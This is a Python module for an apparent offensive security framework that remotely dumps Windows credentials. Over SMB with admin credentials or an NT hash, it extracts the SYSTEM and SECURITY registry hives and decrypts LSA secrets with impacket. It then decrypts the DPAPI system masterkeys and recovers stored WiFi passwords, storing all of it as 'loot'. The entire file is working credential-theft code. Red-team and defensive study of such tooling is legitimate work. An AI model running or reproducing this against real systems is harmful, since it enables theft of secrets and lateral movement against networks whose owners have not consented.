"""DPAPI system-scope triage: DPAPI_SYSTEM keys out of LSA, SYSTEM
masterkeys out of the machine's Protect store, WiFi passwords out of
their XML (DPAPI stage 5).

The machine half of DPAPI — the domain-user chain (stages 1-4) doesn't
touch it. Flow per target:

  1. SYSTEM + SECURITY hives out via the winreg pipe (core/regdump —
     no exec), bootkey offline, LSASecrets yields
     dpapi_machinekey/dpapi_userkey (plus any service-account
     passwords, looted as a bonus)
  2. the SYSTEM-context masterkeys under
     Windows\\System32\\Microsoft\\Protect\\<sid>\\ (and the S-1-5-18
     SYSTEM account's own User\\ dir) decrypt with those keys — plain
     PBKDF2/HMAC, no RSA anywhere on this path
  3. ProgramData\\Microsoft\\Wlansvc\\Profiles\\Interfaces\\*\\*.xml —
     every <keyMaterial> is a hexed DPAPI blob under the SYSTEM
     masterkey, matched by GuidMasterKey -> the WiFi password

Requires local admin (SeBackupPrivilege for the hive saves). Service
SKUs often lack Wlansvc; the e2e fixture mints a REAL profile XML with
a LocalSystem-scope CryptProtectData wrap, so the decrypt path is
proven against Windows' own machinery either way.
"""

from core import dpapi as dpapix
from core import regdump
from core.module import AuxiliaryModule
from core.options import OptAddress, OptPort, OptString

try:
    from impacket.examples.secretsdump import LSASecrets, LocalOperations
    from impacket.smbconnection import SMBConnection  # noqa: F401
except ImportError:
    LSASecrets = None  # console gates run() on requirements

PROTECT = r"Windows\System32\Microsoft\Protect"
WLANSVC = r"ProgramData\Microsoft\Wlansvc\Profiles\Interfaces"


class DpapiSystem(AuxiliaryModule):
    name = "DPAPI System Triage (machine keys + WiFi)"
    description = """
        Pulls the DPAPI_SYSTEM keys from LSA (hives via winreg, no
        exec), decrypts the machine's SYSTEM-context masterkeys, and
        opens every WiFi profile's keyMaterial with them — WiFi
        passwords, plus any service-account secrets the LSA dump
        carries, in creds + loot. Requires local admin; DOMAIN='.'
        for local accounts. PASSWORD or NTHASH.
    """
    authors = ["you"]
    requirements = ["impacket"]

    def register_options(self):
        self.options.add(OptAddress("RHOSTS", required=True,
                                    description="Target(s), comma-separated"))
        self.options.add(OptPort("RPORT", default=445, description="SMB port"))
        self.options.add(OptString("DOMAIN", default=".",
                                   description="Auth domain ('.' = local)"))
        self.options.add(OptString("USERNAME", required=True,
                                   description="Local admin user"))
        self.options.add(OptString("PASSWORD", default="",
                                   description="Password"))
        self.options.add(OptString("NTHASH", default="",
                                   description="NT hash, hex (overrides "
                                               "PASSWORD)"))

    def run(self):
        for host in [h.strip() for h in str(self.get_option("RHOSTS")).split(",")
                     if h.strip()]:
            self._triage(host)

    def _login(self, host):
        return regdump.smb_login(
            host, int(self.get_option("RPORT")),
            str(self.get_option("USERNAME")),
            str(self.get_option("PASSWORD") or ""),
            str(self.get_option("DOMAIN") or "."),
            str(self.get_option("NTHASH") or "").strip())

    def _triage(self, host):
        store = getattr(self.framework, "store", None)
        try:
            conn = self._login(host)
        except Exception as e:
            self.print_error(f"{host}: SMB login failed - {e}")
            return
        try:
            dce = regdump.rrp_bind(conn, host)
        except Exception as e:
            self.print_error(f"{host}: winreg bind failed (admin share "
                             f"required) - {e}")
            conn.close()
            return
        try:
            hives = regdump.pull_hives(
                conn, dce, ["SYSTEM", "SECURITY"],
                warn=lambda m: self.print_error(f"{host}: {m}"))
        finally:
            dce.disconnect()
        if not hives.get("SYSTEM") or not hives.get("SECURITY"):
            self.print_error(f"{host}: SYSTEM+SECURITY hives required")
            conn.close()
            return
        staging = regdump.stage_hives(hives)
        try:
            bootkey = LocalOperations(staging["SYSTEM"]).getBootKey()
            secrets = []

            def capture(_type, secret):
                secrets.append(secret)

            lsa = LSASecrets(staging["SECURITY"], bootkey,
                             perSecretCallback=capture)
            lsa.dumpSecrets()
            lsa.finish()
        except Exception as e:
            self.print_error(f"{host}: LSA decrypt failed - {e}")
            regdump.unstage(staging)
            conn.close()
            return
        regdump.unstage(staging)
        dpapi_system = dpapix.parse_dpapi_system(secrets)
        if not dpapi_system.get("MachineKey"):
            self.print_error(f"{host}: no dpapi_machinekey in the LSA "
                             f"dump")
            conn.close()
            return
        self.print_good(f"{host}: DPAPI_SYSTEM keys recovered "
                        f"(machinekey {dpapi_system['MachineKey'].hex()[:16]}…)")
        # service-account secrets ride the same dump — keep them
        bonus = [s for s in secrets
                 if not s.startswith(("dpapi_machinekey", "dpapi_userkey"))]
        for secret in bonus:
            self.print_good(f"{host}: {secret}")
        if store is not None:
            store.add_loot("dpapi-system", f"dpapi_system keys @ {host}",
                           "\n".join(f"{k}: {v.hex()}"
                                     for k, v in dpapi_system.items()),
                           address=host)
            if bonus:
                store.add_loot("lsa", f"lsa secrets @ {host}",
                               "\n".join(bonus), address=host)
        masterkeys = self._system_masterkeys(conn, host, dpapi_system)
        self._loot_wifi(conn, host, masterkeys, store)
        conn.close()

    def _system_masterkeys(self, conn, host, dpapi_system):
        masterkeys = {}
        for sid_dir in self._list(conn, f"{PROTECT}\\*"):
            if not sid_dir.startswith("S-"):
                continue
            for path in (f"{PROTECT}\\{sid_dir}",
                         f"{PROTECT}\\{sid_dir}\\User"):
                for entry in self._list(conn, f"{path}\\*"):
                    if not dpapix.is_guid_name(entry):
                        continue
                    data = self._read(conn, f"{path}\\{entry}")
                    if data is None:
                        continue
                    try:
                        guid, mk = dpapix.decrypt_system_masterkey_file(
                            data, dpapi_system)
                    except Exception as e:
                        self.print_debug(f"{host}: {sid_dir}/{entry}: {e}")
                        continue
                    if mk is None:
                        self.print_debug(f"{host}: {sid_dir}/{entry}: "
                                         f"system keys didn't fit")
                        continue
                    self.print_good(f"{host}: {sid_dir} {guid}: system "
                                    f"masterkey decrypted")
                    masterkeys[entry.lower()] = mk
                    store = getattr(self.framework, "store", None)
                    if store is not None:
                        store.add_loot("masterkey",
                                       f"dpapi system masterkey {sid_dir}/"
                                       f"{guid} @ {host}", mk.hex(),
                                       address=host)
        if not masterkeys:
            self.print_status(f"{host}: no system masterkeys decrypted")
        return masterkeys

    def _loot_wifi(self, conn, host, masterkeys, store):
        found = 0
        for iface in self._list(conn, f"{WLANSVC}\\*"):
            if iface in (".", ".."):
                continue
            for entry in self._list(conn, f"{WLANSVC}\\{iface}\\*"):
                if not entry.lower().endswith(".xml"):
                    continue
                data = self._read(conn, f"{WLANSVC}\\{iface}\\{entry}")
                if data is None:
                    continue
                try:
                    ssid, password = dpapix.wifi_passwords(data, masterkeys)
                except Exception as e:
                    self.print_debug(f"{host}: {iface}/{entry}: {e}")
                    continue
                if password is None:
                    self.print_debug(f"{host}: {ssid or entry}: no key "
                                     f"(open network, or masterkey missing)")
                    continue
                found += 1
                self.print_good(f"{host}: WiFi {ssid}: {password}")
                if store is not None:
                    store.add_cred(host, f"wifi/{ssid}", ssid, password,
                                   source="dpapi_system")
                    store.add_loot("credential",
                                   f"wifi {ssid} @ {host}", password,
                                   address=host)
        if found:
            self.print_status(f"{host}: {found} WiFi password(s) in loot")

    def _list(self, conn, pattern):
        try:
            return [f.get_longname() for f in conn.listPath("C$", pattern)]
        except Exception:
            return []

    def _read(self, conn, path):
        try:
            buf = []
            conn.getFile("C$", path, buf.append)
            return b"".join(buf)
        except Exception:
            return None
